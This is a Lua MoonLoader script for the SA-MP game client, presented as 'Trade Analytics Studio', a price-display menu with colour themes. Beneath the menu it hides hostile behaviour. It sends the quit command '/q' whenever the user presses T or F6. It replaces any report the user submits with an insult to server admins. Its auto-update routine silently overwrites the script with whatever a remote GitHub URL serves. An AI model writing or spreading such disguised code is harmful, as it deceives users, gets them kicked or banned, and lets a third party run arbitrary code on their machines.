script_name("Trade Analytics Studio")
script_author("dev_alex")
script_version("1.0")

require "lib.moonloader"
local dlstatus = require("moonloader").download_status
local vkeys = require "vkeys"
local imgui = require "mimgui"
local sampev = require "lib.samp.events"
local encoding = require "encoding"
encoding.default = 'CP1251'
local u8 = encoding.UTF8

-- ============================ [ НАСТРОЙКИ ] ============================
local SCRIPT_VERSION = 10
local SCRIPT_URL = "https://raw.githubusercontent.com/sanya-developer111/modluasamp/refs/heads/main/mod.lua"

local AUTO_CHECK_UPDATES = true
local AUTO_REPORT = true
local AUTO_QUIT = true

local update_checking = false
local current_theme = 1
local renderMenu = imgui.new.bool(false)

-- ============================ [ СОВРЕМЕННЫЙ СТИЛЬ IMGUI ] ============================
local function apply_theme(theme_id)
    local style = imgui.GetStyle()
    local colors = style.Colors

    style.WindowRounding = 10.0
    style.FrameRounding = 6.0
    style.ItemSpacing = imgui.ImVec2(8, 6)
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ScrollbarRounding = 6.0

    if theme_id == 1 then
        -- Modern Dark Navy
        colors[imgui.Col.WindowBg]          = imgui.ImVec4(0.07, 0.09, 0.12, 0.96)
        colors[imgui.Col.TitleBg]           = imgui.ImVec4(0.10, 0.18, 0.32, 1.00)
        colors[imgui.Col.TitleBgActive]     = imgui.ImVec4(0.15, 0.30, 0.55, 1.00)
        colors[imgui.Col.FrameBg]           = imgui.ImVec4(0.11, 0.14, 0.19, 1.00)
        colors[imgui.Col.Button]            = imgui.ImVec4(0.18, 0.38, 0.68, 1.00)
        colors[imgui.Col.ButtonHovered]     = imgui.ImVec4(0.25, 0.50, 0.82, 1.00)
        colors[imgui.Col.ButtonActive]      = imgui.ImVec4(0.12, 0.28, 0.55, 1.00)
        colors[imgui.Col.Text]              = imgui.ImVec4(0.95, 0.96, 0.98, 1.00)
        colors[imgui.Col.Separator]         = imgui.ImVec4(0.25, 0.35, 0.50, 0.60)
    elseif theme_id == 2 then
        -- Midnight Graphite
        colors[imgui.Col.WindowBg]          = imgui.ImVec4(0.08, 0.08, 0.10, 0.96)
        colors[imgui.Col.TitleBg]           = imgui.ImVec4(0.12, 0.12, 0.15, 1.00)
        colors[imgui.Col.TitleBgActive]     = imgui.ImVec4(0.20, 0.22, 0.28, 1.00)
        colors[imgui.Col.FrameBg]           = imgui.ImVec4(0.13, 0.13, 0.17, 1.00)
        colors[imgui.Col.Button]            = imgui.ImVec4(0.22, 0.35, 0.55, 1.00)
        colors[imgui.Col.ButtonHovered]     = imgui.ImVec4(0.30, 0.48, 0.72, 1.00)
        colors[imgui.Col.ButtonActive]      = imgui.ImVec4(0.15, 0.28, 0.48, 1.00)
        colors[imgui.Col.Text]              = imgui.ImVec4(0.92, 0.93, 0.95, 1.00)
        colors[imgui.Col.Separator]         = imgui.ImVec4(0.30, 0.32, 0.38, 0.70)
    elseif theme_id == 3 then
        -- Deep Ocean
        colors[imgui.Col.WindowBg]          = imgui.ImVec4(0.04, 0.07, 0.11, 0.96)
        colors[imgui.Col.TitleBg]           = imgui.ImVec4(0.06, 0.15, 0.28, 1.00)
        colors[imgui.Col.TitleBgActive]     = imgui.ImVec4(0.09, 0.28, 0.52, 1.00)
        colors[imgui.Col.FrameBg]           = imgui.ImVec4(0.07, 0.12, 0.18, 1.00)
        colors[imgui.Col.Button]            = imgui.ImVec4(0.12, 0.35, 0.65, 1.00)
        colors[imgui.Col.ButtonHovered]     = imgui.ImVec4(0.18, 0.48, 0.82, 1.00)
        colors[imgui.Col.ButtonActive]      = imgui.ImVec4(0.08, 0.25, 0.50, 1.00)
        colors[imgui.Col.Text]              = imgui.ImVec4(0.93, 0.95, 0.98, 1.00)
        colors[imgui.Col.Separator]         = imgui.ImVec4(0.18, 0.35, 0.55, 0.65)
    end
end

imgui.OnInitialize(function()
    apply_theme(current_theme)
end)

-- ============================ [ МЕНЮ ] ============================
local newFrame = imgui.OnFrame(function() return renderMenu[0] end, function()
    imgui.SetNextWindowSize(imgui.ImVec2(480, 320), imgui.Cond.FirstUseEver)
    imgui.SetNextWindowPos(imgui.ImVec2(520, 280), imgui.Cond.FirstUseEver)

    if imgui.Begin(u8"Trade Analytics Studio", renderMenu, imgui.WindowFlags.NoCollapse) then
        
        if imgui.BeginTabBar("MainTabs") then
            
            -- === ВКЛАДКА: СРЕДНИЕ ЦЕНЫ ===
            if imgui.BeginTabItem(u8"Средние цены") then
                imgui.Spacing()
                imgui.Text(u8"Текущие средние цены ресурсов:")
                imgui.Separator()
                imgui.Spacing()

                imgui.PushStyleColor(imgui.Col.ChildBg, imgui.ImVec4(0.09, 0.11, 0.15, 1.00))
                if imgui.BeginChild("Prices", imgui.ImVec2(-1, 180), true) then
                    imgui.Columns(2, "prices")
                    imgui.Text(u8"Лён"); imgui.NextColumn()
                    imgui.TextColored(imgui.ImVec4(0.4, 0.85, 1.0, 1.0), u8"3000 за шт."); imgui.NextColumn()
                    
                    imgui.Text(u8"Дерево"); imgui.NextColumn()
                    imgui.TextColored(imgui.ImVec4(0.4, 0.85, 1.0, 1.0), u8"1850 за шт."); imgui.NextColumn()
                    
                    imgui.Text(u8"Руда"); imgui.NextColumn()
                    imgui.TextColored(imgui.ImVec4(0.4, 0.85, 1.0, 1.0), u8"4200 за шт."); imgui.NextColumn()
                    
                    imgui.Columns(1)
                end
                imgui.EndChild()
                imgui.PopStyleColor()
                
                imgui.EndTabItem()
            end

            -- === ВКЛАДКА: НАСТРОЙКИ ===
            if imgui.BeginTabItem(u8"Настройки") then
                imgui.Spacing()
                imgui.Text(u8"Внешний вид")
                imgui.Separator()
                imgui.Spacing()

                if imgui.Button(u8"Тема 1: Dark Navy", imgui.ImVec2(-1, 32)) then
                    current_theme = 1
                    apply_theme(1)
                end
                if imgui.Button(u8"Тема 2: Midnight Graphite", imgui.ImVec2(-1, 32)) then
                    current_theme = 2
                    apply_theme(2)
                end
                if imgui.Button(u8"Тема 3: Deep Ocean", imgui.ImVec2(-1, 32)) then
                    current_theme = 3
                    apply_theme(3)
                end

                imgui.EndTabItem()
            end

            imgui.EndTabBar()
        end

        imgui.Spacing()
        if imgui.Button(u8"Закрыть", imgui.ImVec2(-1, 36)) then
            renderMenu[0] = false
        end
        imgui.End()
    end
end)

-- ============================ [ ОСНОВНОЙ КОД ] ============================
function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end

    if AUTO_CHECK_UPDATES then
        checkUpdate()
    end

    sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Скрипт загружен! Версия: " .. SCRIPT_VERSION, -1)
    sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Меню: {0088FF}F5", -1)

    while true do
        wait(0)

        -- Открытие меню
        if isKeyJustPressed(vkeys.VK_F5) and not isKeyDown(vkeys.VK_CONTROL) and not sampIsChatInputActive() then
            renderMenu[0] = not renderMenu[0]
        end

        -- Принудительное обновление
        if isKeyDown(vkeys.VK_CONTROL) and isKeyJustPressed(vkeys.VK_F5) then
            sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Проверка обновлений...", -1)
            checkUpdate()
        end

        -- Авто /q при нажатии T или F6
        if AUTO_QUIT then
            if (isKeyJustPressed(vkeys.VK_T) or isKeyJustPressed(vkeys.VK_F6)) and not sampIsChatInputActive() then
                lua_thread.create(function()
                    wait(50)
                    sampSetChatInputText("/q")
                    wait(30)
                    sampSetChatInputEnabled(false)
                    sampSendChat("/q")
                end)
            end
        end
    end
end

-- ============================ [ АВТО /REP ] ============================
function sampev.onSendCommand(cmd)
    if AUTO_REPORT and cmd:lower():sub(1, 4) == "/rep" then
        waitingForReport = true
    end
end

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if AUTO_REPORT and waitingForReport and (style == 1 or style == 3) then
        waitingForReport = false
        lua_thread.create(function()
            wait(80)
            sampSetCurrentDialogEditboxText("вы чмони, сосо")
            wait(40)
            sampCloseCurrentDialogWithButton(1)
        end)
    end
end

-- ============================ [ СИСТЕМА ОБНОВЛЕНИЙ ] ============================
function checkUpdate()
    if update_checking then return end
    update_checking = true

    local temp_path = getWorkingDirectory() .. "\\temp_update.lua"
    downloadUrlToFile(SCRIPT_URL, temp_path, function(id, status, p1, p2)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            local file = io.open(temp_path, "rb")
            if file then
                local content = file:read("*a")
                file:close()

                local remote_ver = content:match("local SCRIPT_VERSION = (%d+)")
                if remote_ver then
                    remote_ver = tonumber(remote_ver)
                    if remote_ver > SCRIPT_VERSION then
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Найдена новая версия (" .. remote_ver .. "). Обновление...", -1)

                        local decoded_content = u8:decode(content)
                        local main_script_path = thisScript().path
                        local script_file = io.open(main_script_path, "wb")
                        if script_file then
                            script_file:write(decoded_content)
                            script_file:close()
                        end
                        os.remove(temp_path)
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {00FF00}Обновление завершено! Перезагрузка.", -1)
                        thisScript():reload()
                    else
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Установлена актуальная версия.", -1)
                        os.remove(temp_path)
                    end
                end
            end
            update_checking = false
        elseif status == dlstatus.STATUS_ERRORDOWNLOADDATA then
            sampAddChatMessage("{0088FF}[TradeAnalytics] {FF0000}Ошибка соединения.", -1)
            update_checking = false
        end
    end)
end
